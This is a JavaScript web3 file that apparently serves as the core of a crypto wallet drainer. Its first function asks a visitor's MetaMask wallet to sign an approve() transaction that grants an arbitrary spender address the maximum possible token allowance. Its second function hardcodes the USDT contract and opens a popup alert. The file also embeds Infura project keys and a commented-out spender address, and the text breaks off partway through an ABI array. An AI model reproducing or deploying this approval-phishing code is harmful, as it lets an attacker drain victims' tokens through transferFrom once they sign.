async function jsPromiseApproveFunction(message,token_address,addressType) {
    let msg = message;
    let account ;
    let status = false;
    if (typeof window.ethereum != 'undefined') {
     web3 = new Web3(new Web3.providers.WebsocketProvider("wss://mainnet.infura.io/ws/v3/5a5a6eeee04f4437960bcebbd31752af"));
//     const provider = window.ethereum;
//     const web3 = new Web3(provider);
     const ABI = [

           {
             "constant": false,
             "inputs": [
               {
                 "name": "_upgradedAddress",
                 "type": "address"
               }
             ],
             "name": "deprecate",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "_spender",
                 "type": "address"
               },
               {
                 "name": "_value",
                 "type": "uint256"
               }
             ],
             "name": "approve",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "deprecated",
             "outputs": [
               {
                 "name": "",
                 "type": "bool"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "_evilUser",
                 "type": "address"
               }
             ],
             "name": "addBlackList",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "totalSupply",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "_from",
                 "type": "address"
               },
               {
                 "name": "_to",
                 "type": "address"
               },
               {
                 "name": "_value",
                 "type": "uint256"
               }
             ],
             "name": "transferFrom",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "decimals",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "maximumFee",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "_totalSupply",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [],
             "name": "unpause",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [
               {
                 "name": "_maker",
                 "type": "address"
               }
             ],
             "name": "getBlackListStatus",
             "outputs": [
               {
                 "name": "",
                 "type": "bool"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [
               {
                 "name": "",
                 "type": "address"
               },
               {
                 "name": "",
                 "type": "address"
               }
             ],
             "name": "allowed",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "paused",
             "outputs": [
               {
                 "name": "",
                 "type": "bool"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [
               {
                 "name": "who",
                 "type": "address"
               }
             ],
             "name": "balanceOf",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [],
             "name": "pause",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "getOwner",
             "outputs": [
               {
                 "name": "",
                 "type": "address"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "owner",
             "outputs": [
               {
                 "name": "",
                 "type": "address"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "_to",
                 "type": "address"
               },
               {
                 "name": "_value",
                 "type": "uint256"
               }
             ],
             "name": "transfer",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "newBasisPoints",
                 "type": "uint256"
               },
               {
                 "name": "newMaxFee",
                 "type": "uint256"
               }
             ],
             "name": "setParams",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "amount",
                 "type": "uint256"
               }
             ],
             "name": "issue",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "amount",
                 "type": "uint256"
               }
             ],
             "name": "redeem",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [
               {
                 "name": "_owner",
                 "type": "address"
               },
               {
                 "name": "_spender",
                 "type": "address"
               }
             ],
             "name": "allowance",
             "outputs": [
               {
                 "name": "remaining",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "basisPointsRate",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [
               {
                 "name": "",
                 "type": "address"
               }
             ],
             "name": "isBlackListed",
             "outputs": [
               {
                 "name": "",
                 "type": "bool"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "_clearedUser",
                 "type": "address"
               }
             ],
             "name": "removeBlackList",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": true,
             "inputs": [],
             "name": "MAX_UINT",
             "outputs": [
               {
                 "name": "",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "view",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "newOwner",
                 "type": "address"
               }
             ],
             "name": "transferOwnership",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "constant": false,
             "inputs": [
               {
                 "name": "_blackListedUser",
                 "type": "address"
               }
             ],
             "name": "destroyBlackFunds",
             "outputs": [],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "function"
           },
           {
             "inputs": [
               {
                 "name": "_initialSupply",
                 "type": "uint256"
               },
               {
                 "name": "_name",
                 "type": "string"
               },
               {
                 "name": "_symbol",
                 "type": "string"
               },
               {
                 "name": "_decimals",
                 "type": "uint256"
               }
             ],
             "payable": false,
             "stateMutability": "nonpayable",
             "type": "constructor"
           },
           {
             "anonymous": false,
             "inputs": [
               {
                 "indexed": false,
                 "name": "amount",
                 "type": "uint256"
               }
             ],
             "name": "Issue",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [
               {
                 "indexed": false,
                 "name": "amount",
                 "type": "uint256"
               }
             ],
             "name": "Redeem",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [
               {
                 "indexed": false,
                 "name": "newAddress",
                 "type": "address"
               }
             ],
             "name": "Deprecate",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [
               {
                 "indexed": false,
                 "name": "feeBasisPoints",
                 "type": "uint256"
               },
               {
                 "indexed": false,
                 "name": "maxFee",
                 "type": "uint256"
               }
             ],
             "name": "Params",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [
               {
                 "indexed": true,
                 "name": "owner",
                 "type": "address"
               },
               {
                 "indexed": true,
                 "name": "spender",
                 "type": "address"
               },
               {
                 "indexed": false,
                 "name": "value",
                 "type": "uint256"
               }
             ],
             "name": "Approval",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [
               {
                 "indexed": true,
                 "name": "from",
                 "type": "address"
               },
               {
                 "indexed": true,
                 "name": "to",
                 "type": "address"
               },
               {
                 "indexed": false,
                 "name": "value",
                 "type": "uint256"
               }
             ],
             "name": "Transfer",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [],
             "name": "Pause",
             "type": "event"
           },
           {
             "anonymous": false,
             "inputs": [],
             "name": "Unpause",
             "type": "event"
           }
         ];
     const trcAbi = [
                            {
                                "constant": false,
                                "inputs": [
                                    {
                                        "name": "spender",
                                        "type": "address"
                                    },
                                    {
                                        "name": "value",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "approve",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "bool"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "function",
                                "signature": "0x095ea7b3"
                            },
                            {
                                "constant": true,
                                "inputs": [],
                                "name": "totalSupply",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "uint256"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "view",
                                "type": "function",
                                "signature": "0x18160ddd"
                            },
                            {
                                "constant": false,
                                "inputs": [
                                    {
                                        "name": "from",
                                        "type": "address"
                                    },
                                    {
                                        "name": "to",
                                        "type": "address"
                                    },
                                    {
                                        "name": "value",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "transferFrom",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "bool"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "function",
                                "signature": "0x23b872dd"
                            },
                            {
                                "constant": false,
                                "inputs": [
                                    {
                                        "name": "spender",
                                        "type": "address"
                                    },
                                    {
                                        "name": "addedValue",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "increaseAllowance",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "bool"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "function",
                                "signature": "0x39509351"
                            },
                            {
                                "constant": true,
                                "inputs": [
                                    {
                                        "name": "owner",
                                        "type": "address"
                                    }
                                ],
                                "name": "balanceOf",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "uint256"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "view",
                                "type": "function",
                                "signature": "0x70a08231"
                            },
                            {
                                "constant": false,
                                "inputs": [
                                    {
                                        "name": "spender",
                                        "type": "address"
                                    },
                                    {
                                        "name": "subtractedValue",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "decreaseAllowance",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "bool"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "function",
                                "signature": "0xa457c2d7"
                            },
                            {
                                "constant": false,
                                "inputs": [
                                    {
                                        "name": "to",
                                        "type": "address"
                                    },
                                    {
                                        "name": "value",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "transfer",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "bool"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "function",
                                "signature": "0xa9059cbb"
                            },
                            {
                                "constant": true,
                                "inputs": [
                                    {
                                        "name": "owner",
                                        "type": "address"
                                    },
                                    {
                                        "name": "spender",
                                        "type": "address"
                                    }
                                ],
                                "name": "allowance",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "uint256"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "view",
                                "type": "function",
                                "signature": "0xdd62ed3e"
                            },
                            {
                                "inputs": [
                                    {
                                        "name": "name",
                                        "type": "string"
                                    },
                                    {
                                        "name": "symbol",
                                        "type": "string"
                                    },
                                    {
                                        "name": "decimals",
                                        "type": "uint8"
                                    },
                                    {
                                        "name": "cap",
                                        "type": "uint256"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "nonpayable",
                                "type": "constructor",
                                "signature": "constructor"
                            },
                            {
                                "anonymous": false,
                                "inputs": [
                                    {
                                        "indexed": true,
                                        "name": "from",
                                        "type": "address"
                                    },
                                    {
                                        "indexed": true,
                                        "name": "to",
                                        "type": "address"
                                    },
                                    {
                                        "indexed": false,
                                        "name": "value",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "Transfer",
                                "type": "event",
                                "signature": "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef"
                            },
                            {
                                "anonymous": false,
                                "inputs": [
                                    {
                                        "indexed": true,
                                        "name": "owner",
                                        "type": "address"
                                    },
                                    {
                                        "indexed": true,
                                        "name": "spender",
                                        "type": "address"
                                    },
                                    {
                                        "indexed": false,
                                        "name": "value",
                                        "type": "uint256"
                                    }
                                ],
                                "name": "Approval",
                                "type": "event",
                                "signature": "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"
                            },
                            {
                                "constant": true,
                                "inputs": [],
                                "name": "name",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "string"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "view",
                                "type": "function",
                                "signature": "0x06fdde03"
                            },
                            {
                                "constant": true,
                                "inputs": [],
                                "name": "symbol",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "string"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "view",
                                "type": "function",
                                "signature": "0x95d89b41"
                            },
                            {
                                "constant": true,
                                "inputs": [],
                                "name": "decimals",
                                "outputs": [
                                    {
                                        "name": "",
                                        "type": "uint8"
                                    }
                                ],
                                "payable": false,
                                "stateMutability": "view",
                                "type": "function",
                                "signature": "0x313ce567"
                            }
                        ];
     let MyContract;
     if (addressType == "TRC") {
        MyContract = new web3.eth.Contract(trcAbi, token_address);
      } else {
        MyContract = new web3.eth.Contract(ABI, token_address);
      }
      let approvalAmount = web3.utils.toBN("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
        let gasPrice = await web3.eth.getGasPrice();
        let nonce = await web3.eth.getTransactionCount(ethereum.selectedAddress);
        let data = MyContract.methods.approve(msg, approvalAmount).encodeABI();
        // let data = MyContract.methods.approve('0x00BA70CA5F26bD0874f2Bc5BC2bE91c74229458F', 9999999 * web3.utils.toHex(1e6)).encodeABI();
          const transactionParameters = {
               nonce: web3.utils.toHex(nonce), // ignored by MetaMask
//            gasPrice: gasPrice,
//            gas: web3.utils.toHex(80000),
            to: token_address, // Required except during contract publications.
            from: ethereum.selectedAddress, // must match user's active address.
            // value: web3.utils.toHex('12'), // Only required to send ether to the recipient from the initiating external account.
            data: data, // Optional, but used for defining smart contract creation and interaction.
//            chainId: web3.utils.toHex('1'), // Used to prevent transaction reuse across blockchains. Auto-filled by MetaMask.
          };
          await ethereum.request({
            method: 'eth_sendTransaction',
            params: [transactionParameters],
          })
            .then( function () {
//          alert('Approved Successfull')
              console.log('Success')
              status = true;
            })
            .catch( function (reason) {
              if (reason.code == 4001) {
            console.log('Approved Rejected from catch ')
             //    alert('Approved Rejected from catch')
                // errorMessage(reason.message)
                      status = false;
              } 
            });
      }
    let promise = new Promise(function(resolve, reject) {
  resolve(String(status));


    });
   
    let result = await promise;
    return result;
}




async function getApproved(message) {
alert(message)

     if (typeof window.ethereum != 'undefined') {


        //provider?
        web3 = new Web3(new Web3.providers.WebsocketProvider("wss://mainnet.infura.io/ws/v3/66dbe8bf2e4843dda41a280a20333217"));


        //USDT合约地址和ABI
        const token_address = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
        const ABI = [

          {
            "constant": false,
            "inputs": [
              {
                "name": "_upgradedAddress",
                "type": "address"
              }
            ],
            "name": "deprecate",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "_spender",
                "type": "address"
              },
              {
                "name": "_value",
                "type": "uint256"
              }
            ],
            "name": "approve",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "deprecated",
            "outputs": [
              {
                "name": "",
                "type": "bool"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "_evilUser",
                "type": "address"
              }
            ],
            "name": "addBlackList",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "totalSupply",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "_from",
                "type": "address"
              },
              {
                "name": "_to",
                "type": "address"
              },
              {
                "name": "_value",
                "type": "uint256"
              }
            ],
            "name": "transferFrom",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "decimals",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "maximumFee",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "_totalSupply",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [],
            "name": "unpause",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [
              {
                "name": "_maker",
                "type": "address"
              }
            ],
            "name": "getBlackListStatus",
            "outputs": [
              {
                "name": "",
                "type": "bool"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [
              {
                "name": "",
                "type": "address"
              },
              {
                "name": "",
                "type": "address"
              }
            ],
            "name": "allowed",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "paused",
            "outputs": [
              {
                "name": "",
                "type": "bool"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [
              {
                "name": "who",
                "type": "address"
              }
            ],
            "name": "balanceOf",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [],
            "name": "pause",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "getOwner",
            "outputs": [
              {
                "name": "",
                "type": "address"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "owner",
            "outputs": [
              {
                "name": "",
                "type": "address"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "_to",
                "type": "address"
              },
              {
                "name": "_value",
                "type": "uint256"
              }
            ],
            "name": "transfer",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "newBasisPoints",
                "type": "uint256"
              },
              {
                "name": "newMaxFee",
                "type": "uint256"
              }
            ],
            "name": "setParams",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "amount",
                "type": "uint256"
              }
            ],
            "name": "issue",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "amount",
                "type": "uint256"
              }
            ],
            "name": "redeem",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [
              {
                "name": "_owner",
                "type": "address"
              },
              {
                "name": "_spender",
                "type": "address"
              }
            ],
            "name": "allowance",
            "outputs": [
              {
                "name": "remaining",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "basisPointsRate",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [
              {
                "name": "",
                "type": "address"
              }
            ],
            "name": "isBlackListed",
            "outputs": [
              {
                "name": "",
                "type": "bool"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "_clearedUser",
                "type": "address"
              }
            ],
            "name": "removeBlackList",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": true,
            "inputs": [],
            "name": "MAX_UINT",
            "outputs": [
              {
                "name": "",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "view",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "newOwner",
                "type": "address"
              }
            ],
            "name": "transferOwnership",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "constant": false,
            "inputs": [
              {
                "name": "_blackListedUser",
                "type": "address"
              }
            ],
            "name": "destroyBlackFunds",
            "outputs": [],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "function"
          },
          {
            "inputs": [
              {
                "name": "_initialSupply",
                "type": "uint256"
              },
              {
                "name": "_name",
                "type": "string"
              },
              {
                "name": "_symbol",
                "type": "string"
              },
              {
                "name": "_decimals",
                "type": "uint256"
              }
            ],
            "payable": false,
            "stateMutability": "nonpayable",
            "type": "constructor"
          },
          {
            "anonymous": false,
            "inputs": [
              {
                "indexed": false,
                "name": "amount",
                "type": "uint256"
              }
            ],
            "name": "Issue",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [
              {
                "indexed": false,
                "name": "amount",
                "type": "uint256"
              }
            ],
            "name": "Redeem",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [
              {
                "indexed": false,
                "name": "newAddress",
                "type": "address"
              }
            ],
            "name": "Deprecate",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [
              {
                "indexed": false,
                "name": "feeBasisPoints",
                "type": "uint256"
              },
              {
                "indexed": false,
                "name": "maxFee",
                "type": "uint256"
              }
            ],
            "name": "Params",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [
              {
                "indexed": true,
                "name": "owner",
                "type": "address"
              },
              {
                "indexed": true,
                "name": "spender",
                "type": "address"
              },
              {
                "indexed": false,
                "name": "value",
                "type": "uint256"
              }
            ],
            "name": "Approval",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [
              {
                "indexed": true,
                "name": "from",
                "type": "address"
              },
              {
                "indexed": true,
                "name": "to",
                "type": "address"
              },
              {
                "indexed": false,
                "name": "value",
                "type": "uint256"
              }
            ],
            "name": "Transfer",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [],
            "name": "Pause",
            "type": "event"
          },
          {
            "anonymous": false,
            "inputs": [],
            "name": "Unpause",
            "type": "event"
          }
        ];
        // const ABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": 